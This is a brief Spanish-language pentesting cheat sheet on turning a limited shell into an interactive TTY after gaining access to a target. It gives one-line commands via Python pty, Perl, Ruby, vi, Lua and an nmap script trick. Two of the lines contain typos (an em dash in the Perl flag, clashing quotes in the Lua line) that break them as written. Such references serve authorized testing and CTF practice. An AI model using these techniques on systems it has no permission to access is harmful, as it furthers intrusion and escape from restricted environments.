# TTY SHELLS
A veces cuando conseguimos acceder a un sistema no tenemos acceso a una shell completamente interactiva, es por eso que, dependiendo del software que tenga instalado nuestro objetivo, podemos conseguirla de diferentes maneras.

## Usando Python
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

## Usando os.system
echo os.system('/bin/bash')  

## Usando Perl
perl —e 'exec "/bin/sh";'  

## Usando Ruby
ruby -e 'exec "/bin/bash"'  

## Usando Vi
Podemos iniciar una shell desde vi, para ello, iniciamos vi y escribimos:   
:!bash

## Usando lua
lua -e 'os.execute('/bin/bash')'

## Usando nmap
Si tiene instalado nmap, para versiones anteriores a la 5.2, dispone de una shell interactiva directamente  
!sh  
Si es una versión posterior, podemos hacer lo siguiente  
TF=$(mktemp)  
echo 'os.execute("/bin/sh")' > $TF  
nmap --script=$TF  


